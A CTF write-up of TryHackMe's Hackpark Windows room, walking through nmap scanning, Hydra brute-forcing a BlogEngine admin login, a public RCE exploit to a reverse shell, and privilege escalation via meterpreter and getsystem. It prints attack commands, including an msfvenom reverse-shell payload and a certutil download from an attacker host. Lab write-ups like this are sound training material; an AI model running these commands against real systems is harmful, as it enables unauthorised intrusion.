---
title: "Hackpark - TryHackMe Writeup"
date: 2025-11-11
draft: false
summary: "Writeup for Hackpark CTF challenge on TryHackMe."
tags: ["windows", "brute force", "hardcoded creds", "uac bypass"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/hackpark/cover.webp"
  caption: "Hackpark TryHackMe Challenge"
  alt: "Hackpark cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---

Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/hackpark

## Scanning

I performed an **nmap** scan to find open ports and the services running on the target.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN hackpark.nmap -Pn
```

![performing an nmap scan on hackpark machine](https://cdn.ziomsec.com/hackpark/1.webp)

## Initial Foothold

The nmap revealed 2 open ports. So I viewed the web application running on port 80 through my browser.

![accessing the web application](https://cdn.ziomsec.com/hackpark/2.webp)

The clown shown on the web page could be related to the target, so I did a google search and found his name.
- pennywise

Inspecting the source code revealed the version of the blogging application that was running.

![inspecting the application page source](https://cdn.ziomsec.com/hackpark/3.webp)

**searchsploit** revealed an RCE and directory traversal vulnerability related to this particular version.

```shell
searchsploit 'BlogEngine 3.3.6'
```

![searching for exploits](https://cdn.ziomsec.com/hackpark/4.webp)

Before moving forward with the exploit, I visited the *robots.txt* endpoint that was discovered by **nmap**. Here, I found some new endpoints.

![viewing the robots.txt file](https://cdn.ziomsec.com/hackpark/5.webp)

I accessed the endpoints but found nothing interesting. I fuzzed for directories found some interesting endpoints.
```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-laft-directories.txt -fc 500
```

![fuzzing hidden directories on the application](https://cdn.ziomsec.com/hackpark/6.webp)

Accessing the *admin* endpoint redirected me to a login page.

![accessing the admin endpoint](https://cdn.ziomsec.com/hackpark/7.webp)

The home page contained a post with the author name. Clicking on it revealed a username called 'admin'.

![finding the username](https://cdn.ziomsec.com/hackpark/8.webp)

I then used **hydra** to bruteforce the password of the admin user from the *rockyou.txt* wordlist.

![bruteforcing the admin password](https://cdn.ziomsec.com/hackpark/9.webp)

After finding the password, I logged into the application.
- username: `admin`
- password: `1qaz2wsx`

I was then able to access the admin panel.

![accessing the admin panel](https://cdn.ziomsec.com/hackpark/10.webp)

The About section also revealed the identity of the user running the application.

![finding the user running the application](https://cdn.ziomsec.com/hackpark/11.webp)

I now download the RCE exploit.

```shell
searchsploit -m aspx/webapps/46353.cs
```

![downloading the RCE exploit from exploit-db](https://cdn.ziomsec.com/hackpark/12.webp)

I read the description of the exploit on **Exploit-DB**.
- https://www.exploit-db.com/exploits/46353

I also edited the exploit and added my local address to get a reverse shell. I then followed the instructions given in the description to get upload my payload.

![reading about the exploitation steps](https://cdn.ziomsec.com/hackpark/13.webp)

![repeating the exploitation steps](https://cdn.ziomsec.com/hackpark/14.webp)

![repeating the exploitation steps](https://cdn.ziomsec.com/hackpark/15.webp)

![repeating the exploitation steps](https://cdn.ziomsec.com/hackpark/16.webp)

After uploading the payload, I accessed the endpoint and got a reverse shell on my **netcat** listener.

```
curl --path-as-is http://TARGET/?theme=../../App_Data/files
```

![getting a reverse shell from the target](https://cdn.ziomsec.com/hackpark/17.webp)

## Privilege Escalation

The shell was unstable so I created a *temp* directory to hold payloads.

```shell
mkdir temp
```

I then created a payload for a **meterpreter** shell using **msfvenom** and hosted it locally on an **http** server.

```shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=ATTACKER LPORT=4444 -f exe -o rev.exe

python3 -m http.server 80
```

![creating an msfvenom payload](https://cdn.ziomsec.com/hackpark/18.webp)

I downloaded this payload on the target and executed it to get a stable reverse shell on my **metasploit** listener.

```shell
certutil.exe -urlcache -split -f http://ATTACKER/rev.exe
```

![downloading the msfvenom payload](https://cdn.ziomsec.com/hackpark/19.webp)

```shell
set payload windows/meterpreter/reverse_tcp
set LHOST ATTACKER
set LPORT 4444
run
```

![configuring metasploit handler](https://cdn.ziomsec.com/hackpark/20.webp)

Upon execution, I got a meterpreter shell.

![getting a meterpreter shell](https://cdn.ziomsec.com/hackpark/21.webp)

After getting access, I backgrounded my session and used the **local_exploit_suggester** post module to get post exploitation modules.

```
use post/multi/recon/local_exploit_suggester
set session 1
run
```

![using local exploit suggester post module](https://cdn.ziomsec.com/hackpark/22.webp)

![using local exploit suggester post module](https://cdn.ziomsec.com/hackpark/23.webp)

Since the post module detected UAC related vulnerability, I could directly exploit this from my **meterpreter** session. So I entered my session and used the **getsystem** command to escalate my privilege.

```
getsystem
```

![using the suggested exploit to get NT AUTHORITY shell](https://cdn.ziomsec.com/hackpark/24.webp)

After getting *NT AUTHORITY\SYSTEM* access, I captured the user flag from *jeff*'s Desktop and the root flag from *Administrator*'s Desktop.

```shell
more C:\Users\jeff\Desktop\user.txt
more C:\Users\Administrator\Desktop\root.txt
```

![capturing the user flag](https://cdn.ziomsec.com/hackpark/25.webp)

![capturing the root flag](https://cdn.ziomsec.com/hackpark/26.webp)

After capturing the flag, I migrated my shell to a 64 bit service.

```shell
pgrep explorer.exe
migrate PID
```

![migrating to a 64 bit service](https://cdn.ziomsec.com/hackpark/27.webp)

I then uploaded **PowerUp**. From the unprivileged shell, when I ran the **PowerUp** module and **Invoke-AllChecks** command, I found the administrator password.

```shell
powershell.exe -C "Import-Module ./PowerUp.ps1;Invoke-AllChecks"
```

![finding the administrator password](https://cdn.ziomsec.com/hackpark/28.webp)

That's it from my side, until next time !

---
